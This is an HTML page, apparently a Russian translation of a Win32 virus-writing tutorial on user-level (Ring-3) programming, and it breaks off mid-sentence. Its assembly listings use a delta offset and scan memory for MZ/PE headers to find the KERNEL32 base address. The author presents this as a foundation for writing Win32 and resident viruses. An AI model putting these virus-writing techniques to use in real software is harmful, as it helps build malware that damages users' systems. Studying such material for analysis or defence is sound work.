<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>New Page 1</title>
<meta name="Microsoft Theme" content="zero 011">
</head>

<body background="zertxtr.gif" bgcolor="#000000" text="#FFFFFF" link="#6699CC" vlink="#669966" alink="#999999">

<!--mstheme--><font face="Arial, Arial, Helvetica"><code></code>
<!--mstheme--></font>
<h3 align="center"><!--mstheme--><font face="Arial, Arial, Helvetica" color="#CCCCCC"><font color="#00FF00" size="5">&#1055;&#1091;&#1090;&#1077;&#1074;&#1086;&#1076;&#1080;&#1090;&#1077;&#1083;&#1100;
&#1087;&#1086; &#1085;&#1072;&#1087;&#1080;&#1089;&#1072;&#1085;&#1080;&#1102;
&#1074;&#1080;&#1088;&#1091;&#1089;&#1086;&#1074; &#1087;&#1086;&#1076; Win32:
4. Ring-3,
&#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1080;&#1088;&#1086;&#1074;&#1072;&#1085;&#1080;&#1077;
&#1085;&#1072; &#1091;&#1088;&#1086;&#1074;&#1085;&#1077;
&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1077;&#1083;&#1103;</font><!--mstheme--></font></h3>
<!--mstheme--><font face="Arial, Arial, Helvetica">
<p>&#1044;&#1072;, &#1101;&#1090;&#1086;
&#1087;&#1088;&#1072;&#1074;&#1076;&#1072;, &#1095;&#1090;&#1086;
&#1091;&#1088;&#1086;&#1074;&#1077;&#1085;&#1100;
&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1077;&#1083;&#1103;
&#1085;&#1072;&#1083;&#1072;&#1075;&#1072;&#1077;&#1090; &#1085;&#1072;
&#1085;&#1072;&#1089; &#1084;&#1085;&#1086;&#1075;&#1086;
&#1088;&#1077;&#1087;&#1088;&#1077;&#1089;&#1089;&#1080;&#1074;&#1085;&#1099;&#1093;
&#1080; &#1092;&#1072;&#1096;&#1080;&#1089;&#1090;&#1089;&#1082;&#1080;&#1093;
&#1086;&#1075;&#1088;&#1072;&#1085;&#1080;&#1095;&#1077;&#1085;&#1080;&#1081;
&#1085;&#1072; &#1085;&#1072;&#1089;,
&#1086;&#1075;&#1088;&#1072;&#1085;&#1080;&#1095;&#1080;&#1074;&#1072;&#1102;&#1097;&#1080;&#1093;
&#1085;&#1072;&#1096;&#1091; &#1089;&#1074;&#1086;&#1073;&#1086;&#1076;&#1091;,
&#1082; &#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1081; &#1084;&#1099;
&#1087;&#1088;&#1080;&#1074;&#1099;&#1082;&#1083;&#1080;,
&#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1080;&#1088;&#1091;&#1103;
&#1074;&#1080;&#1088;&#1091;&#1089;&#1099; &#1087;&#1086;&#1076; DOS,
&#1085;&#1086; &#1087;&#1072;&#1088;&#1085;&#1080; (&#1080;
&#1076;&#1077;&#1074;&#1091;&#1096;&#1082;&#1080; - &#1087;&#1088;&#1080;&#1084;.
&#1087;&#1077;&#1088;.), &#1101;&#1090;&#1086;
&#1078;&#1080;&#1079;&#1085;&#1100;, &#1101;&#1090;&#1086; Micro$oft.
&#1052;&#1077;&#1078;&#1076;&#1091; &#1087;&#1088;&#1086;&#1095;&#1080;&#1084;,
&#1101;&#1090;&#1086;
&#1077;&#1076;&#1080;&#1085;&#1089;&#1090;&#1074;&#1077;&#1085;&#1085;&#1099;&#1081;
&#1087;&#1091;&#1090;&#1100; &#1089;&#1076;&#1077;&#1083;&#1072;&#1090;&#1100;
&#1090;&#1072;&#1082;, &#1095;&#1090;&#1086;&#1073;&#1099;
&#1074;&#1080;&#1088;&#1091;&#1089; &#1073;&#1099;&#1083;
&#1087;&#1086;&#1083;&#1085;&#1086;&#1089;&#1090;&#1100;&#1102; Win32-&#1089;&#1086;&#1074;&#1084;&#1077;&#1089;&#1090;&#1080;&#1084;&#1099;&#1084;
&#1080; &#1101;&#1090;&#1086; &#1089;&#1088;&#1077;&#1076;&#1072;
&#1086;&#1082;&#1088;&#1091;&#1078;&#1077;&#1085;&#1080;&#1103;
&#1073;&#1091;&#1076;&#1091;&#1097;&#1077;&#1075;&#1086;, &#1082;&#1072;&#1082;
&#1074;&#1099; &#1076;&#1086;&#1083;&#1078;&#1085;&#1099;
&#1079;&#1085;&#1072;&#1090;&#1100;. &#1042;&#1086;-&#1087;&#1077;&#1088;&#1074;&#1099;&#1093;,
&#1076;&#1072;&#1074;&#1072;&#1081;&#1090;&#1077;
&#1087;&#1086;&#1089;&#1084;&#1086;&#1090;&#1088;&#1080;&#1084;
&#1082;&#1072;&#1082; &#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100;
&#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1072;&#1079;&#1099; KERNEL32 (&#1076;&#1083;&#1103;
Win32-&#1089;&#1086;&#1074;&#1084;&#1077;&#1089;&#1090;&#1080;&#1084;&#1086;&#1089;&#1090;&#1080;)
&#1086;&#1095;&#1077;&#1085;&#1100;
&#1087;&#1088;&#1086;&#1089;&#1090;&#1099;&#1084;
&#1086;&#1073;&#1088;&#1072;&#1079;&#1086;&#1084;:
<p><strong>&#1055;&#1088;&#1086;&#1089;&#1090;&#1086;&#1081;
&#1089;&#1087;&#1086;&#1089;&#1086;&#1073;
&#1087;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100;
&#1072;&#1076;&#1088;&#1077;&#1089; &#1073;&#1072;&#1079;&#1099; KERNEL32</strong>
<p>&#1050;&#1072;&#1082; &#1074;&#1099;
&#1079;&#1085;&#1072;&#1077;&#1090;&#1077;, &#1082;&#1086;&#1075;&#1076;&#1072;
&#1084;&#1099; &#1079;&#1072;&#1087;&#1091;&#1089;&#1082;&#1072;&#1077;&#1084;
&#1087;&#1088;&#1080;&#1083;&#1086;&#1078;&#1077;&#1085;&#1080;&#1077;&#1084;,
&#1082;&#1086;&#1076;
&#1074;&#1099;&#1079;&#1099;&#1074;&#1072;&#1077;&#1090;&#1089;&#1103;
&#1086;&#1090;&#1082;&#1091;&#1076;&#1072;-&#1090;&#1086; &#1080;&#1079;
KERNEL32 (&#1090;.&#1077;. KERNEL &#1076;&#1077;&#1083;&#1072;&#1077;&#1090;
&#1074;&#1099;&#1079;&#1086;&#1074; &#1085;&#1072;&#1096;&#1077;&#1075;&#1086;
&#1082;&#1086;&#1076;&#1072;), &#1072; &#1087;&#1086;&#1090;&#1086;&#1084;,
&#1077;&#1089;&#1083;&#1080; &#1074;&#1099;
&#1087;&#1086;&#1084;&#1085;&#1080;&#1090;&#1077;,
&#1082;&#1086;&#1075;&#1076;&#1072; &#1074;&#1099;&#1079;&#1086;&#1074;
&#1089;&#1076;&#1077;&#1083;&#1072;&#1085;, &#1072;&#1076;&#1088;&#1077;&#1089;
&#1074;&#1086;&#1079;&#1074;&#1088;&#1072;&#1090;&#1072;
&#1083;&#1077;&#1078;&#1080;&#1090; &#1085;&#1072;
&#1089;&#1090;&#1077;&#1082;&#1077; (&#1072;&#1076;&#1088;&#1077;&#1089;
&#1087;&#1072;&#1084;&#1103;&#1090;&#1080; &#1074; ESP).
&#1044;&#1072;&#1074;&#1072;&#1081;&#1090;&#1077;
&#1087;&#1088;&#1080;&#1084;&#1077;&#1085;&#1080;&#1084; &#1101;&#1090;&#1080;
&#1079;&#1085;&#1072;&#1085;&#1080;&#1103; &#1085;&#1072;
&#1087;&#1088;&#1072;&#1082;&#1090;&#1080;&#1082;&#1077;:
<p><code><!--mstheme--></font>
<pre><font size="2"><b>;---[ CUT HERE ]-------------------------------------------------------------

        .586p                           ; &#1041;&#1072;&#1093;... &#1087;&#1088;&#1086;&#1089;&#1090;&#1086; &#1090;&#1072;&#1082;
        .model  flat                    ; &#1061;&#1077;&#1093;&#1077;&#1093;&#1077;, &#1103; &#1083;&#1102;&#1073;&#1083;&#1102; 32 &#1073;&#1080;&#1090;&#1072;

        .data                           ; &#1050;&#1086;&#1077;-&#1082;&#1072;&#1082;&#1080;&#1077; &#1076;&#1072;&#1085;&#1085;&#1099;&#1077; (&#1080;&#1093; &#1090;&#1088;&#1077;&#1073;&#1091;&#1077;&#1090;
                                        ; TASM32/TLINK32)

        db      ?

        .code

 start:
        mov     eax,[esp]               ; &#1058;&#1077;&#1087;&#1077;&#1088;&#1100; EAX &#1073;&#1091;&#1076;&#1077;&#1090; &#1088;&#1072;&#1074;&#1077;&#1085; BFF8XXXXh
                                        ; (&#1074; w9X)
                                        ; &#1090;.&#1077;. &#1075;&#1076;&#1077;-&#1090;&#1086; &#1074;&#1085;&#1091;&#1090;&#1088;&#1080; API
                                        ; CreateProcess :)
        ret                             ; &#1042;&#1086;&#1079;&#1074;&#1088;&#1072;&#1077;&#1084;&#1089;&#1103; &#1074; &#1085;&#1077;&#1075;&#1086; ;)
 end    start

;---[ CUT HERE ]-------------------------------------------------------------</b></font></pre>
<!--mstheme--><font face="Arial, Arial, Helvetica"></code>
<p>&#1054;&#1082;, &#1101;&#1090;&#1086;
&#1087;&#1088;&#1086;&#1089;&#1090;&#1086;. &#1059; &#1085;&#1072;&#1089;
&#1074; EAX &#1077;&#1089;&#1090;&#1100;
&#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077;,
&#1087;&#1088;&#1080;&#1084;&#1077;&#1088;&#1085;&#1086;
&#1088;&#1072;&#1074;&#1085;&#1086; BFF8XXXX (XXXX &#1085;&#1077;
&#1080;&#1075;&#1088;&#1072;&#1077;&#1090; &#1088;&#1086;&#1083;&#1080;,
&#1085;&#1072;&#1084; &#1085;&#1077; &#1085;&#1091;&#1078;&#1085;&#1086;
&#1079;&#1085;&#1072;&#1090;&#1100; &#1077;&#1075;&#1086;
&#1090;&#1086;&#1095;&#1085;&#1086;. &#1058;&#1072;&#1082; &#1082;&#1072;&#1082;
Win32-&#1087;&#1083;&#1072;&#1090;&#1092;&#1086;&#1088;&#1084;&#1099;
&#1086;&#1073;&#1099;&#1095;&#1085;&#1086; &#1074;&#1089;&#1077;
&#1086;&#1075;&#1088;&#1091;&#1083;&#1103;&#1102;&#1090; &#1076;&#1086;
&#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;&#1099;,
&#1079;&#1085;&#1072;&#1095;&#1080;&#1090;
&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1086;&#1082; KERNEL32
&#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1074;
&#1085;&#1072;&#1095;&#1072;&#1083;&#1077;
&#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;&#1099;, &#1080; &#1084;&#1099;
&#1084;&#1086;&#1078;&#1077;&#1084; &#1083;&#1077;&#1075;&#1082;&#1086;
&#1085;&#1072;&#1081;&#1090;&#1080; &#1077;&#1075;&#1086;. &#1040;
&#1082;&#1072;&#1082; &#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1084;&#1099;
&#1085;&#1072;&#1081;&#1076;&#1077;&#1084;
&#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1086;&#1082; PE, &#1086;
&#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1084; &#1103; &#1080;
&#1074;&#1077;&#1076;&#1091; &#1088;&#1077;&#1095;&#1100;, &#1084;&#1099;
&#1073;&#1091;&#1076;&#1077;&#1084; &#1079;&#1085;&#1072;&#1090;&#1100;
&#1072;&#1076;&#1088;&#1077;&#1089; KERNEL32. &#1061;&#1084;&#1084;&#1084;,
&#1085;&#1072;&#1096; &#1083;&#1080;&#1084;&#1080;&#1090; - 50h
&#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;. &#1061;&#1077;&#1093;&#1077;,
&#1085;&#1077;
&#1073;&#1077;&#1089;&#1087;&#1086;&#1082;&#1086;&#1081;&#1090;&#1077;&#1089;&#1100;,
&#1076;&#1072;&#1083;&#1077;&#1077;
&#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1091;&#1077;&#1090;
&#1085;&#1077;&#1082;&#1086;&#1090;&#1086;&#1088;&#1099;&#1081;
&#1082;&#1086;&#1076; ;).
<p><code><!--mstheme--></font>
<pre><font size="2"><b>;---[ CUT HERE ]-------------------------------------------------------------

        .586p
        .model  flat

 extrn  ExitProcess:PROC

        .data

 limit  equ     5

        db      0

 ;-------------------------------------;
 ; &#1053;&#1077;&#1085;&#1091;&#1078;&#1085;&#1099;&#1077; &#1080; &#1085;&#1077;&#1089;&#1091;&#1097;&#1077;&#1089;&#1090;&#1074;&#1077;&#1085;&#1085;&#1099;&#1077; &#1076;&#1072;&#1085;&#1085;&#1099;&#1077; :)                                       ;
 ;-------------------------------------;

        .code

 test:
        call    delta
 delta:
        pop     ebp
        sub     ebp,offset delta

        mov     esi,[esp]
        and     esi,0FFFF0000h
        call    GetK32

        push    00000000h
        call    ExitProcess

 ;-------------------------------------;
 ; &#1043;&#1088;&#1093;&#1084;, &#1103; &#1087;&#1088;&#1077;&#1076;&#1087;&#1086;&#1083;&#1072;&#1075;&#1072;&#1102;, &#1095;&#1090;&#1086; &#1074;&#1099;, &#1087;&#1086; &#1082;&#1088;&#1072;&#1081;&#1085;&#1077;&#1081; &#1084;&#1077;&#1088;&#1077;, &#1085;&#1086;&#1088;&#1084;&#1072;&#1083;&#1100;&#1085;&#1099;&#1081; asm-&#1082;&#1086;&#1076;&#1077;&#1088;, &#1090;&#1086;   ;
 ; &#1090;&#1086; &#1077;&#1089;&#1090;&#1100; &#1079;&#1085;&#1072;&#1077;&#1090;&#1077;, &#1095;&#1090;&#1086; &#1087;&#1077;&#1088;&#1074;&#1099;&#1081; &#1073;&#1083;&#1086;&#1082; &#1080;&#1085;&#1089;&#1090;&#1088;&#1091;&#1082;&#1094;&#1080;&#1081; &#1087;&#1088;&#1077;&#1076;&#1085;&#1072;&#1079;&#1085;&#1072;&#1095;&#1072;&#1077;&#1090;&#1089;&#1103; &#1076;&#1083;&#1103; &#1087;&#1086;&#1083;&#1091;&#1095;&#1077;&#1085;&#1080;&#1103; ;
 ; &#1076;&#1077;&#1083;&#1100;&#1090;&#1072;-&#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1103; (&#1093;&#1086;&#1088;&#1086;&#1096;&#1086;, &#1101;&#1090;&#1086; &#1085;&#1077; &#1085;&#1077;&#1086;&#1073;&#1093;&#1086;&#1076;&#1080;&#1084;&#1086; &#1074; &#1076;&#1072;&#1085;&#1085;&#1086;&#1084; &#1087;&#1088;&#1080;&#1084;&#1077;&#1088;&#1077;, &#1082;&#1072;&#1082; &#1073;&#1099; &#1090;&#1086;   ;
 ; &#1085;&#1080; &#1073;&#1099;&#1083;&#1086; &#1103; &#1093;&#1086;&#1095;&#1091; &#1087;&#1088;&#1080;&#1076;&#1072;&#1090;&#1100; &#1076;&#1072;&#1085;&#1085;&#1086;&#1084;&#1091; &#1082;&#1086;&#1076;&#1091; &#1089;&#1093;&#1086;&#1076;&#1089;&#1090;&#1074;&#1086; &#1089; &#1074;&#1080;&#1088;&#1091;&#1089;&#1086;&#1084;). &#1053;&#1072;&#1084; &#1080;&#1085;&#1090;&#1077;&#1088;&#1077;&#1089;&#1077;&#1085;   ;
 ; &#1074;&#1090;&#1086;&#1088;&#1086;&#1081; &#1073;&#1083;&#1086;&#1082;. &#1052;&#1099; &#1087;&#1086;&#1084;&#1077;&#1097;&#1072;&#1077;&#1084; &#1074; ESI &#1072;&#1076;&#1088;&#1077;&#1089;, &#1086;&#1090;&#1082;&#1091;&#1076;&#1072; &#1073;&#1099;&#1083;&#1086; &#1074;&#1099;&#1079;&#1074;&#1072;&#1085;&#1086; &#1085;&#1072;&#1096;&#1077;           ;
 ; &#1087;&#1088;&#1080;&#1083;&#1086;&#1078;&#1077;&#1085;&#1080;&#1077;. &#1054;&#1085; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1090;&#1089;&#1103; &#1074; ESP (&#1077;&#1089;&#1083;&#1080; &#1084;&#1099;, &#1082;&#1086;&#1085;&#1077;&#1095;&#1085;&#1086;, &#1085;&#1077; &#1090;&#1088;&#1086;&#1075;&#1072;&#1083;&#1080; &#1089;&#1090;&#1077;&#1082; &#1087;&#1086;&#1089;&#1083;&#1077;  ;
 ; &#1079;&#1072;&#1075;&#1088;&#1091;&#1079;&#1082;&#1080; &#1087;&#1088;&#1086;&#1075;&#1088;&#1072;&#1084;&#1084;&#1099;. &#1042;&#1090;&#1086;&#1088;&#1072;&#1103; &#1080;&#1085;&#1089;&#1090;&#1088;&#1091;&#1082;&#1094;&#1080;&#1103;, AND, &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1090; &#1085;&#1072;&#1095;&#1072;&#1083;&#1086; &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;&#1099;, &#1080;&#1079; ;
 ; &#1082;&#1086;&#1090;&#1086;&#1088;&#1086;&#1081; &#1073;&#1099;&#1083; &#1074;&#1099;&#1079;&#1074;&#1072;&#1085; &#1085;&#1072;&#1096; &#1082;&#1086;&#1076;. &#1052;&#1099; &#1074;&#1099;&#1079;&#1099;&#1074;&#1072;&#1077;&#1084; &#1085;&#1072;&#1096;&#1091; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1091;, &#1087;&#1086;&#1089;&#1083;&#1077; &#1095;&#1077;&#1075;&#1086;       ;
 ; &#1087;&#1088;&#1077;&#1088;&#1099;&#1074;&#1072;&#1077;&#1084; &#1087;&#1088;&#1086;&#1094;&#1077;&#1089;&#1089; ;).                                                    ;
 ;-------------------------------------;

 GetK32:

 __1:
        cmp     byte ptr [ebp+K32_Limit],00h
        jz      WeFailed

        cmp     word ptr [esi],&quot;ZM&quot;
        jz      CheckPE

 __2:
        sub     esi,10000h
        dec     byte ptr [ebp+K32_Limit]
        jmp     __1

 ;-------------------------------------;
 ; &#1057;&#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1084;&#1099; &#1087;&#1088;&#1086;&#1074;&#1077;&#1088;&#1103;&#1077;&#1084;, &#1085;&#1077; &#1087;&#1088;&#1077;&#1074;&#1099;&#1089;&#1080;&#1083;&#1080; &#1083;&#1080; &#1084;&#1099; &#1083;&#1080;&#1084;&#1080;&#1090; (50 &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;). &#1055;&#1086;&#1089;&#1083;&#1077; &#1090;&#1086;&#1075;&#1086;, ;
 ; &#1082;&#1072;&#1082; &#1084;&#1099; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1084; &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;&#1091; &#1089; &#1089;&#1080;&#1075;&#1085;&#1072;&#1090;&#1091;&#1088;&#1086;&#1081; 'MZ' &#1074; &#1085;&#1072;&#1095;&#1072;&#1083;&#1077;, &#1080;&#1097;&#1077;&#1084; &#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1086;&#1082; PE.   ;
 ; &#1045;&#1089;&#1083;&#1080; &#1084;&#1099; &#1077;&#1075;&#1086; &#1085;&#1077; &#1085;&#1072;&#1093;&#1086;&#1076;&#1080;&#1084;, &#1090;&#1086; &#1074;&#1099;&#1095;&#1080;&#1090;&#1072;&#1077; 10 &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094; (10000h &#1073;&#1072;&#1081;&#1090;&#1086;&#1074;), &#1091;&#1084;&#1077;&#1085;&#1100;&#1096;&#1072;&#1077;&#1084; ;
 ; &#1087;&#1077;&#1088;&#1077;&#1084;&#1077;&#1085;&#1085;&#1091;&#1102; &#1083;&#1080;&#1084;&#1080;&#1090;&#1072; &#1080; &#1080;&#1097;&#1077;&#1084; &#1089;&#1085;&#1086;&#1074;&#1072;.                                          ;
 ;-------------------------------------;

 CheckPE:
        mov     edi,[esi+3Ch]
        add     edi,esi
        cmp     dword ptr [edi],&quot;EP&quot;
        jz      WeGotK32
        jmp     __2
 WeFailed:
        mov     esi,0BFF70000h
 WeGotK32:
        xchg    eax,esi
        ret

 K32_Limit      dw      limit

 ;-------------------------------------;
 ; &#1052;&#1099; &#1087;&#1086;&#1083;&#1091;&#1095;&#1072;&#1077;&#1084; &#1079;&#1085;&#1072;&#1095;&#1077;&#1085;&#1080;&#1077; &#1087;&#1086; &#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1102; 3Ch &#1080;&#1079; &#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1072; MZ (&#1090;&#1072;&#1084; &#1089;&#1086;&#1076;&#1077;&#1088;&#1078;&#1080;&#1090;&#1089;&#1103;     ;
 ; RVA-&#1072;&#1076;&#1088;&#1077;&#1089; &#1085;&#1072;&#1095;&#1072;&#1083;&#1072; &#1079;&#1072;&#1075;&#1086;&#1083;&#1086;&#1074;&#1082;&#1072; PE), &#1087;&#1086;&#1090;&#1086;&#1084; &#1089;&#1086;&#1086;&#1090;&#1085;&#1086;&#1089;&#1080;&#1084; &#1077;&#1075;&#1086; &#1089; &#1072;&#1076;&#1088;&#1077;&#1089;&#1086;&#1084; &#1089;&#1090;&#1088;&#1072;&#1085;&#1080;&#1094;&#1099;,  ;
 ; &#1080; &#1077;&#1089;&#1083;&#1080; &#1072;&#1076;&#1088;&#1077;&#1089; &#1087;&#1072;&#1084;&#1103;&#1090;&#1080;, &#1085;&#1072;&#1093;&#1086;&#1076;&#1103;&#1097;&#1080;&#1081;&#1089;&#1103; &#1087;&#1086; &#1076;&#1072;&#1085;&#1085;&#1086;&#1084;&#1091; &#1089;&#1084;&#1077;&#1097;&#1077;&#1085;&#1080;&#1102; - &#1084;&#1077;&#1090;&#1082;&#1072; PE, &#1084;&#1099;      ;
 ; &#1084;&#1099; &#1089;&#1095;&#1080;&#1090;&#1072;&#1077;&#1084;, &#1095;&#1090;&#1086; &#1085;&#1072;&#1096;&#1083;&#1080; &#1090;&#1086;, &#1095;&#1090;&#1086; &#1085;&#1091;&#1078;&#1085;&#1086;... &#1080; &#1101;&#1090;&#1086; &#1076;&#1077;&#1081;&#1089;&#1090;&#1074;&#1080;&#1090;&#1077;&#1083;&#1100;&#1085;&#1086; &#1090;&#1072;&#1082;! ;)       ;
 ;-------------------------------------;

end     test
;---[ CUT HERE ]-------------------------------------------------------------</b></font></pre>
<!--mstheme--><font face="Arial, Arial, Helvetica"></code>
<p>&#1056;&#1077;&#1082;&#1086;&#1084;&#1077;&#1085;&#1076;&#1072;&#1094;&#1080;&#1103;:
&#1103;
&#1087;&#1088;&#1086;&#1090;&#1077;&#1089;&#1090;&#1080;&#1088;&#1086;&#1074;&#1072;&#1083;
&#1101;&#1090;&#1086; &#1091; &#1084;&#1077;&#1085;&#1103; &#1085;&#1077;
&#1073;&#1099;&#1083;&#1086; &#1085;&#1080;&#1082;&#1072;&#1082;&#1080;&#1093;
&#1087;&#1088;&#1086;&#1073;&#1083;&#1077;&#1084; &#1074; Win98 &#1080; WinNT4
&#1089;
&#1091;&#1089;&#1090;&#1072;&#1085;&#1086;&#1074;&#1083;&#1077;&#1085;&#1085;&#1099;&#1084;
SP3, &#1082;&#1072;&#1082; &#1073;&#1099; &#1090;&#1086; &#1085;&#1080;
&#1073;&#1099;&#1083;&#1086;, &#1090;&#1072;&#1082; &#1082;&#1072;&#1082;
&#1103; &#1085;&#1077; &#1079;&#1085;&#1072;&#1102;, &#1095;&#1090;&#1086;
&#1084;&#1086;&#1078;&#1077;&#1090;
&#1087;&#1088;&#1086;&#1080;&#1079;&#1086;&#1081;&#1090;&#1080;, &#1103;
&#1089;&#1086;&#1074;&#1077;&#1090;&#1091;&#1102; &#1074;&#1072;&#1084;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;
SEH, &#1095;&#1090;&#1086;&#1073;&#1099;
&#1080;&#1079;&#1073;&#1077;&#1078;&#1072;&#1090;&#1100;
&#1074;&#1086;&#1079;&#1084;&#1086;&#1078;&#1085;&#1099;&#1093;
&#1086;&#1096;&#1080;&#1073;&#1086;&#1082; &#1080;
&#1089;&#1080;&#1085;&#1077;&#1075;&#1086;
&#1101;&#1082;&#1088;&#1072;&#1085;&#1072;. SEH
&#1073;&#1091;&#1076;&#1077;&#1090;
&#1086;&#1073;&#1098;&#1103;&#1089;&#1085;&#1077;&#1085; &#1074;
&#1087;&#1086;&#1089;&#1083;&#1077;&#1076;&#1091;&#1102;&#1097;&#1080;&#1093;
&#1091;&#1088;&#1086;&#1082;&#1072;&#1093;. &#1061;&#1077;&#1093;,
&#1101;&#1090;&#1086;&#1090; &#1084;&#1077;&#1090;&#1086;&#1076;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1083;
Lord Julus &#1074; &#1089;&#1074;&#1086;&#1080;&#1093;
&#1090;&#1091;&#1090;&#1086;&#1088;&#1080;&#1072;&#1083;&#1072;&#1093; (&#1076;&#1083;&#1103;
&#1087;&#1086;&#1080;&#1089;&#1082;&#1072; GetModuleHandleA &#1074;
&#1079;&#1072;&#1088;&#1072;&#1078;&#1077;&#1085;&#1085;&#1099;&#1093;
&#1092;&#1072;&#1081;&#1083;&#1072;&#1093;), &#1095;&#1090;&#1086;
&#1085;&#1077; &#1086;&#1095;&#1077;&#1085;&#1100;
&#1101;&#1092;&#1092;&#1077;&#1082;&#1090;&#1080;&#1074;&#1085;&#1086;
&#1076;&#1083;&#1103; &#1084;&#1086;&#1080;&#1093; &#1085;&#1091;&#1078;&#1076;,
&#1082;&#1072;&#1082; &#1073;&#1099; &#1090;&#1086; &#1085;&#1080;
&#1073;&#1099;&#1083;&#1086;, &#1103; &#1087;&#1086;&#1082;&#1072;&#1078;&#1091;
&#1089;&#1086;&#1073;&#1089;&#1090;&#1074;&#1077;&#1085;&#1085;&#1091;&#1102;
&#1074;&#1077;&#1088;&#1089;&#1080;&#1102; &#1101;&#1090;&#1086;&#1075;&#1086;
&#1082;&#1086;&#1076;&#1072;, &#1075;&#1076;&#1077;
&#1086;&#1073;&#1098;&#1103;&#1089;&#1085;&#1102;, &#1095;&#1090;&#1086;
&#1084;&#1086;&#1078;&#1085;&#1086;
&#1089;&#1076;&#1077;&#1083;&#1072;&#1090;&#1100; &#1089;
&#1080;&#1084;&#1087;&#1086;&#1088;&#1090;&#1072;&#1084;&#1080;.
&#1053;&#1072;&#1087;&#1088;&#1080;&#1084;&#1077;&#1088;, &#1101;&#1090;&#1086;
&#1084;&#1086;&#1078;&#1085;&#1086;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;
&#1074; &#1087;&#1077;&#1088;-&#1087;&#1088;&#1086;&#1094;&#1077;&#1089;&#1089;&#1085;&#1099;&#1093;
(per-process)
&#1088;&#1077;&#1079;&#1080;&#1076;&#1077;&#1085;&#1090;&#1085;&#1099;&#1093;
&#1074;&#1080;&#1088;&#1091;&#1089;&#1072;&#1093; &#1089;
&#1085;&#1077;&#1073;&#1086;&#1083;&#1100;&#1096;&#1080;&#1084;&#1080;
&#1080;&#1079;&#1084;&#1077;&#1085;&#1077;&#1085;&#1080;&#1103;&#1084;&#1080;
&#1074; &#1087;&#1088;&#1086;&#1094;&#1077;&#1076;&#1091;&#1088;&#1077; ;).
<p><strong>&#1055;&#1086;&#1083;&#1091;&#1095;&#1080;&#1090;&#1100;
&#1101;&#1090;&#1080;
&#1089;&#1091;&#1084;&#1072;&#1089;&#1096;&#1077;&#1076;&#1096;&#1080;&#1077;
&#1092;&#1091;&#1085;&#1082;&#1094;&#1080;&#1080; API</strong></p>
<p>Ring-3, &#1082;&#1072;&#1082; &#1103; &#1091;&#1078;&#1077;
&#1075;&#1086;&#1074;&#1086;&#1088;&#1080;&#1083;, &#1101;&#1090;&#1086;
&#1091;&#1088;&#1086;&#1074;&#1077;&#1085;&#1100;
&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1077;&#1083;&#1103;,
&#1087;&#1086;&#1101;&#1090;&#1086;&#1084;&#1091; &#1085;&#1072;&#1084;
&#1076;&#1086;&#1089;&#1090;&#1091;&#1087;&#1085;&#1099;
&#1090;&#1086;&#1083;&#1100;&#1082;&#1086; &#1077;&#1075;&#1086;
&#1085;&#1077;&#1084;&#1085;&#1086;&#1075;&#1080;&#1077;
&#1074;&#1086;&#1079;&#1084;&#1086;&#1078;&#1085;&#1086;&#1089;&#1090;&#1080;.
&#1052;&#1099; &#1085;&#1077; &#1084;&#1086;&#1078;&#1077;&#1084;
&#1080;&#1089;&#1087;&#1086;&#1083;&#1100;&#1079;&#1086;&#1074;&#1072;&#1090;&#1100;
&#1087;&#1086;&#1088;&#1090;&#1099;, &#1095;&#1080;&#1090;&#1072;&#1090;&#1100;
&#1080;&#1083;&#1080; &#1087;&#1080;&#1089;&#1072;&#1090;&#1100; &#1074;
&#1086;&#1087;&#1088;&#1077;&#1076;&#1077;&#1083;&#1077;&#1085;&#1085;&#1099;&#1077;
&#1086;&#1073;&#1083;&#1072;&#1089;&#1090;&#1080;
&#1087;&#1072;&#1084;&#1103;&#1090;&#1080; &#1080; &#1090;&#1072;&#1082;
&#1076;&#1072;&#1083;&#1077;&#1077;. Micro$oft
&#1086;&#1089;&#1085;&#1086;&#1074;&#1099;&#1074;&#1072;&#1083;&#1072;
&#1089;&#1074;&#1086;&#1080;
